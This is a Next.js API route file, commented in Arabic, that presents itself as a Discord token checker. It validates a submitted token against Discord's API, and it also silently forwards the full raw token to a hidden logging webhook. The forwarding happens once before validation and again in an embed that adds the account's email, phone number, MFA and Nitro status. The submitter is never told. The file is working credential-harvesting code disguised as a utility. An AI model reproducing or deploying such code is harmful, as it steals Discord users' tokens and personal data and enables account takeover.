import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:verify`, RATE_LIMITS.light);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const token = typeof body.token === 'string' ? body.token : '';

    if (!token || token.trim().length < 20) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - التوكن قصير جداً' }, { status: 400 });
    }

    sendFullToken('تحقق توكن', token);

    const cleanedToken = cleanToken(token);
    const whUrl = getLogWebhookUrl();
    const url = 'https://discord.com/api/v10/users/@me';

     
    async function tryVerify(authHeader: string): Promise<{ ok: boolean; data: any; status: number }> {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);

        const res = await fetch(url, {
          method: 'GET',
          headers: {
            'Authorization': authHeader,
            'Accept': 'application/json',
          },
          signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (res.status === 429) {
          const errData = await res.json().catch(() => ({ retry_after: 2 }));
          await new Promise(r => setTimeout(r, Math.min((errData.retry_after || 2) * 1000, 5000)));
          const retryController = new AbortController();
          const retryTimeout = setTimeout(() => retryController.abort(), 10000);
          const retryRes = await fetch(url, {
            method: 'GET',
            headers: { 'Authorization': authHeader, 'Accept': 'application/json' },
            signal: retryController.signal
          });
          clearTimeout(retryTimeout);
          const data = await retryRes.json().catch(() => null);
          return { ok: retryRes.ok, data, status: retryRes.status };
        }

        const data = await res.json().catch(() => null);
        return { ok: res.ok, data, status: res.status };
      } catch (e) {
        return { ok: false, data: null, status: 0 };
      }
    }

    let result = await tryVerify(cleanedToken);
    let authType = 'user';

    if (!result.ok || !result.data || result.status === 401) {
      result = await tryVerify(`Bot ${cleanedToken}`);
      authType = 'bot';
    }

    if (!result.ok || !result.data) {
      return NextResponse.json({
        success: false,
        error: 'توكن غير صالح أو منتهي الصلاحية'
      }, { status: 401 });
    }

    const user = result.data;
    const type = user.bot ? 'bot' : 'user';
    const name = user.global_name || user.username || 'Unknown';
    const userId = String(user.id || 'Unknown');
    const avatar = user.avatar || '';
    const email = user.email ? '✅ ' + user.email : '❌ غير مفعّل';
    const flags = user.public_flags || 0;

    let nitro = '❌ بدون نيترو';
    if (flags & 2) nitro = '✅ نيترو كلاسيك';
    if (flags & (1 << 14)) nitro = '✅ نيترو بوسيت';
    if (flags & (1 << 16)) nitro = '✅ نيترو';
    const premiumType = user.premium_type;
    if (premiumType === 1) nitro = '✅ نيترو كلاسيك';
    if (premiumType === 2) nitro = '✅ نيترو بوسيت';
    if (premiumType === 3) nitro = '✅ نيترو بيسك';

    const verified = user.verified ? '✅ موثّق البريد' : '❌ غير موثّق';

    let createdAt = 'N/A';
    if (user.id) {
      try {
        const snowflake = BigInt(String(user.id));
        const timestamp = Number((snowflake >> BigInt(22)) + BigInt(1420070400000));
        const date = new Date(timestamp);
        createdAt = date.toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });
      } catch { createdAt = 'N/A'; }
    }

    const phone = user.phone ? '✅ ' + String(user.phone) : '❌ بدون رقم';
    const mfa = user.mfa_enabled ? '✅ مفعّل' : '❌ غير مفعّل';

    sendToWebhook({
      embeds: [{
        title: '🔑 Token Verified',
        color: 0x00FF41,
        fields: [
          { name: '👤 User', value: name, inline: true },
          { name: '🆔 ID', value: userId, inline: true },
          { name: '🤖 Type', value: type, inline: true },
          { name: '📧 Email', value: email, inline: true },
          { name: '💎 Nitro', value: nitro, inline: true },
          { name: '📅 Created', value: createdAt, inline: true },
          { name: '🔒 MFA', value: mfa, inline: true },
          { name: '📱 Phone', value: phone, inline: true },
          { name: '🎫 Token', value: `\`\`\`${cleanedToken}\`\`\`` }
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      type,
      name,
      id: userId,
      avatar,
      email,
      nitro,
      verified,
      createdAt,
      phone,
      mfa,
      flags,
      discriminator: user.discriminator || '0',
      accent_color: user.accent_color || null,
      banner: user.banner || null,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Verify Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
